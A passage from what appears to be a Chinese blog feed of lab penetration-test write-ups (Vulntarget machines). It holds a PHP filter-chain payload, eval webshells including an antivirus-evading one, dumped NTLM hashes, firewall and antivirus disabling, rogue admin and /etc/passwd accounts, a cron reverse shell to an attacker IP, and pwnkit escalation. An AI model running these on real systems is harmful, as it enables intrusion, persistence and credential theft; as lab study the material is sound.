FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/var/www/html/public/index.php&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用php-filter-chain生成自己想要的命令后然后传入就行了</p><p><img src="../images/image-20231128202809407.png" alt="image-20231128202809407"></p><p>然后上蚁剑就行了 </p><p><img src="../images/image-20231128203313060.png" alt="image-20231128203313060"></p><p>低权限 尝试提权  先上线viper  </p><p><img src="../images/image-20231128203535851.png" alt="image-20231128203535851"></p><p>直接跑提权模块  sudo suid 啥的 也可以看看  但是这个里一般先跑这个   看看内核有没有可利用的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><p>然后跑出了我们的老伙伴</p><p><img src="../images/image-20231129151705027.png" alt="image-20231129151705027"></p><p>然后直接跑这个exp就行了</p><p>靶机可能没打坏了  打到底还是没root权限  不过不影响</p><p>收集一下信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:ce:01:48 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.52.130/24 brd 192.168.52.255 scope global dynamic ens33</span><br><span class="line">       valid_lft 1690sec preferred_lft 1690sec</span><br><span class="line">    inet6 fe80::20c:29ff:fece:148/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: ens38: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:ce:01:52 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.20.141/24 brd 10.0.20.255 scope global ens38</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fece:152/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>一共是有两个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.130</span><br><span class="line">10.0.20.141</span><br></pre></td></tr></table></figure><p>扫一下内网发现是只扫到了我们的这台机器  猜测是开启了防火墙  于是只扫端口来判断是否存在其他主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fs* -h 10.0.20.0/24 -np -p 21,22,80,81,135,137,139,445,1357,3306,8080,8081</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231129153528952.png" alt="image-20231129153528952"></p><p>扫描结果发现是存在两个ip  一个是本机的ip 一个是内网其他主机的ip 并且开放了80端口  存在web界面</p><p>挂个代理进行访问</p><p><img src="../images/image-20231129153904253.png" alt="image-20231129153904253"></p><p>后台存在弱口令  admin/admin123 进去  然后就去搜索这个框架的漏洞  发现存在sql注入</p><p><a href="https://www.exploit-db.com/exploits/50644">https://www.exploit-db.com/exploits/50644</a>  这篇文章就是</p><p><img src="../images/image-20231129154129887.png" alt="image-20231129154129887"></p><p>抓个包 然后丢到sqlmap来跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains sqlmap -r sql.txt --os-shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231129154459765.png" alt="image-20231129154459765"></p><p>他一共是上传了两个马子  一个马子是可以上传文件  一个马子是可以后门<strong>(可惜的是不能连蚁剑)</strong></p><p>而且呢  经过测试发现  这里的话是存在waf的  就是上传一般的webshell是会被查杀的  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如一句话这种  &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>所以这里的话得上免杀马 (这里用的是作者wp里给的马  ) </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">echo ^&lt;^?php $a = $_REQUEST[&#x27;d&#x27;];$a = &quot;$a&quot;;$b[&#x27;test&#x27;] = &quot;&quot;;eval($b[&#x27;test&#x27;].&quot;$a&quot;);?^&gt;^ &gt; test.php</span><br></pre></td></tr></table></figure><p>其实这里也有两个马子 这里就不放出来了</p><p><img src="D:\L1n_Blog\source\images\image-20231129155054365.png" alt="image-20231129155054365"></p><p>然后上蚁剑就行了</p><p><img src="D:\L1n_Blog\source\images\image-20231129155150874.png" alt="image-20231129155150874"></p><p>成功上线  由于这台机器是这个windows机器  于是尝试跑一下tasklist  看看有没有杀软</p><p><img src="D:\L1n_Blog\source\images\image-20231129155313377.png" alt="image-20231129155313377"></p><p>发现是存在windows的自带的杀软 defend  <strong>(这里本来是想使用修改注册表的方法来关掉这个杀软  但是发现不行 )</strong></p><p>于是开始上免杀了  这里的使用的是掩日的本地隔离方法来做免杀</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="D:\L1n_Blog\source\images\image-20231129155606600.png" alt="image-20231129155606600"></p><p>然后上传免杀过的exe文件 (先生成c文件   然后免杀生成exe文件)</p><p><img src="D:\L1n_Blog\source\images\image-20231129155804322.png" alt="image-20231129155804322"></p><p><img src="D:\L1n_Blog\source\images\image-20231129155824812.png" alt="image-20231129155824812"></p><p>使用方法   <code>Df6.exe Df6.txt</code></p><p><img src="D:\L1n_Blog\source\images\image-20231129155912721.png" alt="image-20231129155912721"></p><p><img src="D:\L1n_Blog\source\images\image-20231129155944997.png" alt="image-20231129155944997"></p><p>主机成功的上线  然后开始收集信息  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line"></span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username       Domain           NTLM                              SHA1</span><br><span class="line">--------       ------           ----                              ----</span><br><span class="line">Administrator  WIN-JJJBQ4N87RA  dfc8d2bfa540a0a6e2248a82322e654e  cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username          Domain           Password</span><br><span class="line">--------          ------           --------</span><br><span class="line">(null)            (null)           (null)</span><br><span class="line">Administrator     WIN-JJJBQ4N87RA  (null)</span><br><span class="line">WIN-JJJBQ4N87RA$  WORKGROUP        (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username          Domain           Password</span><br><span class="line">--------          ------           --------</span><br><span class="line">(null)            (null)           (null)</span><br><span class="line">Administrator     WIN-JJJBQ4N87RA  (null)</span><br><span class="line">win-jjjbq4n87ra$  WORKGROUP        (null)</span><br></pre></td></tr></table></figure><p>这里其实拿到了这个system权限  这个管理员的密码知不知道其实无所谓了  <strong>我们都可以直接改了(或者新增管理员用户进去了)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run killav  //上线meterpreter 获取高权限后可以关闭杀软   (记录一个命令)</span><br></pre></td></tr></table></figure><p>然后开启3389端口  rdp进去看看</p><p>(防火墙也要记得关了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改本地管理员账号</span><br><span class="line">net user administrator qwer1234!</span><br><span class="line"></span><br><span class="line">新添加本地管理员账户</span><br><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p>随便选个账户登进去就行了 </p><p>这里最好还是选择  第一个用本地管理员账户登录  因为这样的话能看到原始的桌面上的东西 用新账号的话就会出现新的桌面  空白的  还得取翻目录  比较麻烦</p><p><img src="D:\L1n_Blog\source\images\image-20231129161626872.png" alt="image-20231129161626872"></p><p>登录进去后 发现有个ssh管理工具  然后有个ip  </p><p><img src="D:\L1n_Blog\source\images\image-20231129161805657.png" alt="image-20231129161805657"></p><p>然后这样就可以拿到账号密码了  (其实账号密码就是刚开始的管理员密码  Admin#123)</p><p>这是一种拿到该机器root的方法 <strong>(挂fscan扫出来也是内网就这个一台机器)</strong></p><p>接下是挂二级代理将该ip给外带出来到viper上</p><p><img src="D:\L1n_Blog\source\images\image-20231129162129645.png" alt="image-20231129162129645"></p><p>设置好二级代理后   直接上viper设置监听</p><p><img src="D:\L1n_Blog\source\images\image-20231129162249739.png" alt="image-20231129162249739"></p><p>注意好设置  然后开启监听  生成elf文件</p><p>这里注意一点就是  先将elf文件转换成base64编码  然后再传入该机器中  这样才会避免呗defender查杀</p><p><img src="D:\L1n_Blog\source\images\image-20231129162603422.png" alt="image-20231129162603422"></p><p><img src="D:\L1n_Blog\source\images\image-20231129163003466.png" alt="image-20231129163003466"></p><p>md  不管了  反正思路就是这个思路  可能靶机被我打坏了  </p><p>然后还是和第一个靶机一样  跑suggester来提权到root就行  结束</p><p>接下来是记录一点东西</p><p>除了定时任务和写ssh当后门外  还有一个方法是往/etc/passwd中写东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">生成密码： openssl passwd -1 -salt admin 123456 </span><br><span class="line">-1 的意思是使用md5crypt加密算法 </span><br><span class="line">-salt 指定盐为admin </span><br><span class="line">123456 明文密码</span><br><span class="line"></span><br><span class="line">echo &#x27;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;cshm:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd #增加超级用户账号</span><br><span class="line">passwd cshm #修改cshm的密码为cshm123</span><br><span class="line"></span><br><span class="line">echo &quot;wxg:x:1000:1000::/:/bin/sh&quot; &gt;&gt; /etc/passwd  #增加普通用户账号</span><br><span class="line">passwd wxg  #修改wxg的密码为wxg147258369</span><br></pre></td></tr></table></figure><p><strong>总结  有几点好处就是体会到了免杀  之前打的靶机全是那种理想环境  (缺点就是没有域环境)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;此环境是没有域的  纯是内网&lt;/p&gt;
&lt;p&gt;目标ip 192.168.52.130&lt;/p&gt;
&lt;p&gt;fscan扫一下&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Vulntarget-b</title>
    <link href="https://ke1nys.github.io/posts/cc293b70.html"/>
    <id>https://ke1nys.github.io/posts/cc293b70.html</id>
    <published>2023-11-23T11:19:00.000Z</published>
    <updated>2023-12-06T02:51:48.633Z</updated>
    
    <content type="html"><![CDATA[<p>目标ip 192.168.52.128</p><p>先使用fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ./fscan_amd64 -h 192.168.52.128 -p 1-10000</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.128  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">192.168.52.128:81 open</span><br><span class="line">192.168.52.128:80 open</span><br><span class="line">192.168.52.128:888 open</span><br><span class="line">192.168.52.128:22 open</span><br><span class="line">192.168.52.128:21 open</span><br><span class="line">192.168.52.128:3306 open</span><br><span class="line">192.168.52.128:8888 open</span><br><span class="line">[*] alive ports len is: 7</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://192.168.52.128     code:200 len:1326   title:没有找到站点</span><br><span class="line">[*] WebTitle: http://192.168.52.128:888 code:403 len:548    title:403 Forbidden</span><br><span class="line">[*] WebTitle: http://192.168.52.128:8888 code:302 len:219    title:Redirecting... 跳转url: http://192.168.52.128:8888/login</span><br><span class="line">[*] WebTitle: http://192.168.52.128:81  code:200 len:14404  title:极致CMS建站系统</span><br><span class="line">[*] WebTitle: http://192.168.52.128:8888/login code:200 len:802    title:安全入口校验失败</span><br></pre></td></tr></table></figure><p>看到8888端口  猜测是宝塔搭建的  去访问这个81端口  是个web服务</p><p><img src="../images/image-20231123194702413.png" alt="image-20231123194702413"></p><p>去google一下 发现存在个漏洞  <a href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p><p>扫一下目录  找后台  网站的那个登录入口时坏的  用不了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">11:06:02] 200 -  479B  - /404.html                                         </span><br><span class="line">[11:06:05] 403 -  548B  - /Public/                                          </span><br><span class="line">[11:06:08] 301 -  162B  - /A  -&gt;  http://192.168.52.128:81/A/               </span><br><span class="line">[11:06:10] 302 -    0B  - /admin.php  -&gt;  http://192.168.52.128:81/admin.php/Login/index.html</span><br><span class="line">[11:06:21] 301 -  162B  - /backup  -&gt;  http://192.168.52.128:81/backup/     </span><br><span class="line">[11:06:21] 403 -  548B  - /backup/                                          </span><br><span class="line">[11:06:23] 301 -  162B  - /cache  -&gt;  http://192.168.52.128:81/cache/       </span><br><span class="line">[11:06:23] 403 -  548B  - /cache/                                           </span><br><span class="line">[11:06:32] 200 -    4KB - /favicon.ico                                      </span><br><span class="line">[11:06:37] 200 -  917B  - /index.html                                       </span><br><span class="line">[11:06:37] 200 -   14KB - /index.php                                        </span><br><span class="line">[11:06:37] 200 -    0B  - /index.php/login/                                 </span><br><span class="line">[11:06:37] 301 -  162B  - /install  -&gt;  http://192.168.52.128:81/install/   </span><br><span class="line">[11:06:37] 200 -   75B  - /install/                                         </span><br><span class="line">[11:06:37] 200 -   75B  - /install/index.php?upgrade/</span><br><span class="line">[11:06:54] 200 -   22KB - /readme.txt                                       </span><br><span class="line">[11:06:55] 200 -  157B  - /robots.txt                                       </span><br><span class="line">[11:06:59] 200 -  495B  - /sitemap.xml                                      </span><br><span class="line">[11:07:00] 301 -  162B  - /static  -&gt;  http://192.168.52.128:81/static/     </span><br><span class="line">[11:07:08] 200 -  816B  - /web.config</span><br></pre></td></tr></table></figure><p>访问admin.php 找到后台管理入口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123   弱口令登录成功</span><br></pre></td></tr></table></figure><p>于是去参考上面给的文章的步骤直接打就行了</p><p><img src="../images/image-20231123195043115.png" alt="image-20231123195043115"></p><p>成功写入  连蚁剑进行下一步操作</p><p><img src="../images/image-20231123195214018.png" alt="image-20231123195214018"></p><p>发现执行失败  看看是不是存在disable_function</p><p><img src="../images/image-20231123195243172.png" alt="image-20231123195243172"></p><p>使用蚁剑插件进行绕过</p><p><img src="../images/image-20231123195312397.png" alt="image-20231123195312397"></p><p>挨个试就能试出来的</p><p><img src="../images/image-20231123195342814.png" alt="image-20231123195342814"></p><p>成功 反弹个shell到攻击机上</p><p><img src="../images/image-20231123201958733.png" alt="image-20231123201958733"></p><p>然后写个定时任务   免得shell断了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.129/3389 0&gt;&amp;1&quot; | crontab -  //写定时任务  </span><br><span class="line"></span><br><span class="line">echo $(crontab -l | grep -v &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.129/3389 0&gt;&amp;1&quot;) | crontab -   //删除定时任务</span><br></pre></td></tr></table></figure><p>这里sudo -l  和suid没有发现什么可用于提权的  于是上线viper跑一下看看有没有内核提权</p><p>上传个elf文件运行就行了</p><p><img src="../images/image-20231123202610436.png" alt="image-20231123202610436"></p><p>如何跑一下提权exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line">set sessions 1</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line">[*] 192.168.52.128 - Collecting local exploits for x64/linux...</span><br><span class="line">[*] 192.168.52.128 - 188 exploit checks are being tried...</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/pkexec: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/su_login: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.52.128 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br><span class="line">[-] 192.168.52.128 - Post interrupted by the console user</span><br></pre></td></tr></table></figure><p>如何就会发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.</span><br></pre></td></tr></table></figure><p>这个模块可以跑  于是直接上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231123203055708.png" alt="image-20231123203055708"></p><p>成功拿到root权限  现在开始查看内网ip  先弹个shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.52.128  netmask 255.255.255.0  broadcast 192.168.52.255</span><br><span class="line">        inet6 fe80::6eb2:c966:5aac:35d2  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:f9:82:6d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 90995  bytes 21146861 (20.1 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 81592  bytes 16363478 (15.6 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens37: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.0.20.30  netmask 255.255.255.0  broadcast 10.0.20.255</span><br><span class="line">        inet6 fe80::1162:e042:35a0:5cd0  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:f9:82:77  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 25  bytes 2701 (2.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 